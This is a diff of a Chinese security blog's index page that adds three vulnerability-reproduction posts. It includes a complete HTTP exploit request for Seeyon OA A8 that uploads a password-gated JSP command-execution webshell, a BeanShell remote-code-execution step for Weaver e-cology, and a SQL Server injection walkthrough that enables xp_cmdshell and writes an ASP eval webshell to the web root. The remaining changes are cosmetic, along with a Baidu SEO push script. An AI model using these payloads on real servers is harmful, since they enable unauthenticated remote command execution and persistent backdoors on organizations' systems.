@@ -47,6 +47,22 @@
   
   
 
+<script>
+  (function () {
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    } else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+
+</script>
+
+
 
   
 
@@ -74,17 +90,17 @@
 		<nav class="header-menu">
 			<ul>
 			
-				<li><a href="/" target="_blank">主页</a></li>
+				<li><a href="/" >主页</a></li>
 			
-				<li><a href="/tags/Web安全" target="_blank">Web安全</a></li>
+				<li><a href="/tags/Web安全" >Web安全</a></li>
 			
-				<li><a href="/tags/内网渗透" target="_blank">内网渗透</a></li>
+				<li><a href="/tags/内网渗透" >内网渗透</a></li>
 			
-				<li><a href="/tags/漏洞复现" target="_blank">漏洞复现</a></li>
+				<li><a href="/tags/漏洞复现" >漏洞复现</a></li>
 			
-				<li><a href="/tags/工具使用" target="_blank">工具使用</a></li>
+				<li><a href="/tags/工具使用" >工具使用</a></li>
 			
-				<li><a href="/tags/Linux" target="_blank">Linux</a></li>
+				<li><a href="/tags/Linux" >Linux</a></li>
 			
 			</ul>
 		</nav>
@@ -191,6 +207,394 @@
           </div>
           <div id="js-content" class="content-ll">
             
+
+  
+    <article id="post-10" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2019/10/15/10/" target="_blank">致远 OA A8远程Getshell</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2019/10/15/10/" class="archive-article-date">
+        <time datetime="2019-10-15T08:55:26.331Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-15</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="0x00-漏洞详情"><a href="#0x00-漏洞详情" class="headerlink" title="0x00 漏洞详情"></a>0x00 漏洞详情</h1><blockquote>
+<p>今年6月，360CERT 监测到致远 A8+ 某些版本系统，存在远程任意文件上传文件上传漏洞，并且无需登录即可触发。攻击者构造恶意文件，成功利用漏洞后可造成Getshell</p>
+</blockquote>
+<h1 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h1><ul>
+<li>致远A8-V5协同管理软件 V6.1sp1</li>
+<li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li>
+<li>致远A8+协同管理软件 V7.1</li>
+</ul>
+<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p> 一，访问漏洞路径<br> <code>/seeyon/htmlofficeservlet</code></p>
+<p> 出现如下内容则表示存在漏洞</p>
+<p> <img src="/images/10/1.png" alt></p>
+<p> 二，使用Burp抓包，上EXP</p>
+<p>  <img src="/images/10/2.png" alt></p>
+<p> 三，调用命令执行<br>访问<code>/test123456.jsp?pwd=asasd3344&amp;cmd=cmd%20+/c+whoami</code></p>
+<p> <img src="/images/10/3.png" alt></p>
+<h1 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h1><pre class="line-numbers language-python"><code class="language-python">POST <span class="token operator">/</span>seeyon<span class="token operator">/</span>htmlofficeservlet HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">1121</span>
+User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">4.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE <span class="token number">6.0</span><span class="token punctuation">;</span> Windows NT <span class="token number">5.1</span><span class="token punctuation">;</span> SV1<span class="token punctuation">)</span>
+Host<span class="token punctuation">:</span> xxxxxxxxx
+Pragma<span class="token punctuation">:</span> no<span class="token operator">-</span>cache
+
+DBSTEP V3<span class="token number">.0</span>     <span class="token number">355</span>             <span class="token number">0</span>               <span class="token number">666</span>             DBSTEP<span class="token operator">=</span>OKMLlKlV
+OPTION<span class="token operator">=</span>S3WYOSWLBSGr
+currentUserId<span class="token operator">=</span>zUCTwigsziCAPLesw4gsw4oEwV66
+CREATEDATE<span class="token operator">=</span>wUghPB3szB3Xwg66
+RECORDID<span class="token operator">=</span>qLSGw4SXzLeGw4V3wUw3zUoXwid6
+originalFileId<span class="token operator">=</span>wV66
+originalCreateDate<span class="token operator">=</span>wUghPB3szB3Xwg66
+FILENAME<span class="token operator">=</span>qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
+needReadFile<span class="token operator">=</span>yRWZdAS6
+originalCreateDate<span class="token operator">=</span>wLSGP4oEzLKAz4<span class="token operator">=</span>iz<span class="token operator">=</span><span class="token number">66</span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.*,java.io.*"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>!public static String excuteCmd<span class="token punctuation">(</span>String c<span class="token punctuation">)</span> <span class="token punctuation">{</span>StringBuilder line <span class="token operator">=</span> new StringBuilder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>Process pro <span class="token operator">=</span> Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>BufferedReader buf <span class="token operator">=</span> new BufferedReader<span class="token punctuation">(</span>new InputStreamReader<span class="token punctuation">(</span>pro<span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>String temp <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> buf<span class="token punctuation">.</span>readLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>line<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>buf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> catch <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>line<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">.</span>getMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> line<span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"asasd3344"</span><span class="token punctuation">.</span>equals<span class="token punctuation">(</span>request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token operator">&amp;</span>!<span class="token string">""</span><span class="token punctuation">.</span>equals<span class="token punctuation">(</span>request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>out<span class="token punctuation">.</span>println<span class="token punctuation">(</span><span class="token string">"&lt;pre>"</span><span class="token operator">+</span>excuteCmd<span class="token punctuation">(</span>request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>out<span class="token punctuation">.</span>println<span class="token punctuation">(</span><span class="token string">":-)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">></span><span class="token number">6e4f045d4b8506bf492ada7e3390d7ce</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/其他//" class="article-tag-list-link color3">其他</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2019/10/15/10/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-9" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2019/10/15/9/" target="_blank">泛微OA远程代码执行</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2019/10/15/9/" class="archive-article-date">
+        <time datetime="2019-10-15T08:46:35.762Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-15</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="0X01-漏洞描述"><a href="#0X01-漏洞描述" class="headerlink" title="0X01  漏洞描述"></a>0X01  漏洞描述</h1><p>2019年9月19日，泛微e-cology OA系统被爆出存在远程代码执行漏洞。该漏洞存在于泛微协同管理应用平台OA系统的BeanShell组件中，该组件为系统自带且允许未授权访问。攻击者通过调用BeanShell组件的问题接口可直接在目标服务器上执行任意命令，目前该漏洞安全补丁已发布，请使用泛微e-cology OA系统的用户尽快采取防护措施。<br>该漏洞CNVD编号：CNVD-2019-32204</p>
+<h1 id="0x02-影响版本："><a href="#0x02-影响版本：" class="headerlink" title="0x02  影响版本："></a>0x02  影响版本：</h1><p><code>泛微e-cology&lt;=9.0</code></p>
+<h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03  漏洞复现"></a>0x03  漏洞复现</h1><p>访问正常页面如图，且可以看到泛微OA的版本号<br><img src="/images/9/1.png" alt></p>
+<p>如果版本号小于等于9.0可尝试访问如下目录<br>（在网站根目录下加或者多级目录下依次尝试）</p>
+<p><code>/weaver/bsh.servlet.BshServlet/</code></p>
+<p>如果出现<strong>BeanShell Test Servlet</strong>字样即可直接命令执行</p>
+<p><img src="/images/9/2.png" alt></p>
+<p>例如我们执行whoami<br><code>exec(&quot;whoami&quot;);</code><br><img src="/images/9/3.png" alt></p>
+<p>从上图中可以看到，当前用户是system权限。则说明命令成功执行，当然漏洞也是存在的。</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/其他//" class="article-tag-list-link color3">其他</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2019/10/15/9/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-8" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2019/10/14/8/" target="_blank">SQL SERVER 注入（三）</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2019/10/14/8/" class="archive-article-date">
+        <time datetime="2019-10-14T11:13:59.452Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-14</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="开启xp-cmdshell获取webshell"><a href="#开启xp-cmdshell获取webshell" class="headerlink" title="开启xp_cmdshell获取webshell"></a>开启xp_cmdshell获取webshell</h1><p>xp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> from master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects where xtype <span class="token operator">=</span> <span class="token string">'x'</span> and name <span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> WAITFOR DELAY <span class="token string">'0:0:5'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果延迟 5s后返回正常页面的话则判断存在组件 xp_cmdshell。<br>如果删除了xp_cmdshell 组件的话可以用下面的命令恢复</p>
+<pre class="line-numbers language-java"><code class="language-java">恢复／删除 xp_cmdshell
+exec sp_addextendedproc xp_cmdshell<span class="token punctuation">,</span><span class="token annotation punctuation">@dllname</span><span class="token operator">=</span><span class="token string">'xplog70.dll'</span>
+exec sp_dropextendedproc <span class="token string">'xplog70.dll'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>关闭xp_cmdshell</p>
+<pre class="line-numbers language-java"><code class="language-java">EXEC sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
+RECONFIGURE<span class="token punctuation">;</span>
+EXEC sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>
+RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>启用xp_cmdshell</p>
+<pre class="line-numbers language-java"><code class="language-java">EXEC sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
+RECONFIGURE<span class="token punctuation">;</span>
+EXEC sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
+RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功开启 xp_cmdshell 之后，我们要进行的最重要的一步就是找到网站的根路径，这里也<br>是较难的一点。下面有三种方法：</p>
+<ul>
+<li>找到报错页面得到物理路径，如 404页面</li>
+<li>查找网站文件并把路径写入到临时表当中</li>
+<li>列出各个盘下面的文件，将其写入临时表查看</li>
+</ul>
+<p>1.对于一些粗心的网站管理员可能 404 等错误页面是iis 默认的报错页面，而这个报错页面就会暴露出网站的物理路径，此时我们就可以写一个shell 文件进去。</p>
+<p><img src="/images/8/1.png" alt></p>
+<p>2.在大佬博客上看到的找物理路径的方法是找到一个网站文件，将其路径写入临时表后再使<br>用sqlmap跑出来。具体思路如下:</p>
+<p>在数据库 tempdb创建临时表temp</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span>use test<span class="token punctuation">;</span>create table <span class="token function">tt_tmp</span> <span class="token punctuation">(</span>tmp1 <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/8/2.png" alt></p>
+<p>创建完成之后使用 sqlmap 可以看到成功创建表temp</p>
+<p>Sqlmap命令: </p>
+<pre class="line-numbers language-java"><code class="language-java">python27 sqlmap<span class="token punctuation">.</span>py<span class="token operator">-</span>u<span class="token string">"192.168.10.19/char.asp?id=1"</span><span class="token operator">-</span>D test <span class="token operator">--</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/8/3.png" alt></p>
+<p>之后我们将char.asp文件的路径写入到该字段当中</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span>use test<span class="token punctuation">;</span>insert into <span class="token function">tt_tmp</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">)</span> exec master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'dir /s /b c:\char.asp'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/8/4.png" alt></p>
+<p>这个语句回车之后的响应时间会稍微长一点，是因为将很数据插入到表中需要一定时间</p>
+<p>Sqlmap命令:</p>
+<pre class="line-numbers language-python"><code class="language-python">python27 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"192.168.10.19/char.asp?id=1"</span> <span class="token operator">-</span>D test <span class="token operator">-</span>T tt_tmp <span class="token operator">-</span>C tmp1 <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/8/5.png" alt></p>
+<p>这样我们成功的查询到了网站的根路径，随后我们尝试写入一句话</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">;</span><span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'echo ^&lt;script language=vbs runat=server^>eval(request("c"))^&lt;/script^> > c:\\inetpub\\wwwroot\\shell.asp'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>执行之后返回正常界面，我们访问 192.168.10.19/shell.asp 观察</p>
+<p><img src="/images/8/6.png" alt></p>
+<p>返回状态码200，asp,内容已经被成功解析，查看靶机是否被成功写入。</p>
+<p><img src="/images/8/6.png" alt></p>
+<p>成功写入一句话木马，尝试才到连接</p>
+<p><img src="/images/8/7.png" alt></p>
+<p><img src="/images/8/8.png" alt></p>
+<p><img src="/images/8/9.png" alt></p>
+<p>成功获取 webshell</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">注入</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql server</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2019/10/14/8/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
 
   
     <article id="post-7" class="article article-type-post  article-index" itemscope itemprop="blogPost">
@@ -1351,7 +1755,7 @@ Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018-2021 <a href="http://klforever.cn/" target="_blank">WLSMILE</a>
+    		&copy; 2019-2021 <a href="http://klforever.cn/" target="_blank">WLSMILE</a>
     	</div>
       	<div class="footer-right">
 			
@@ -1458,10 +1862,6 @@ Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
               </li>
              
@@ -1474,15 +1874,11 @@ Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">免杀</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1495,6 +1891,14 @@ Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql server</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1612,7 +2016,7 @@ Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
     	<section class="tools-section tools-section-me" q-show="aboutme">
         
           
-  	  		<div class="aboutme-wrap" id="aboutme">一个在网络安全道路上漂泊的小白~</div>
+  	  		<div class="aboutme-wrap" id="aboutme">一个在网络安全道路上漂泊的人儿。</div>
   	  	
     	</section>
     
@@ -1692,7 +2096,7 @@ Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
 <script type="text/javascript" src="/plugins/activate-power-mode/activate-power-mode.js"></script>
 <script>
   POWERMODE.colorful = true; // make power mode colorful
-  POWERMODE.shake = false; // turn off shake
+  POWERMODE.shake = true; // turn off shake
   document.body.addEventListener('input', POWERMODE);
 </script>
 
@@ -1743,7 +2147,7 @@ Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
        scale: 0.6 
     },
     react: {
-       opacity: 0.8 
+       opacity: 1 
     }
   })
 
